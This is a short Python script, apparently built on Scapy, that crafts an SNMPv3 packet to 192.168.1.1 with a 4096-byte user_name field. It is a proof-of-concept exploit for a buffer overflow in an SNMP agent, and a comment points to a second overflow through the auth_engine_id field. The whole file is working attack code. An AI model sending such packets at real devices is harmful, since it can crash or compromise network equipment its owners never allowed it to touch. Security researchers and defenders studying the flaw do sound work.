def main():
    DST = "192.168.1.1"

    snmp = SNMPv3(version=3)
    pkt = IP(dst=DST)/UDP(sport=RandShort(), dport=161)/snmp
    pkt = snmpsetauth(pkt, "emaze", "MD5")
    pkt["SNMPv3"].flags = 4

    # Replace "user_name" with "auth_engine_id" in the next line to trigger the
    # other overflow
    pkt["SNMPv3"].security.user_name = "A"*4096

    pkt.show()
    send(pkt)

if __name__ == "__main__":
    main()
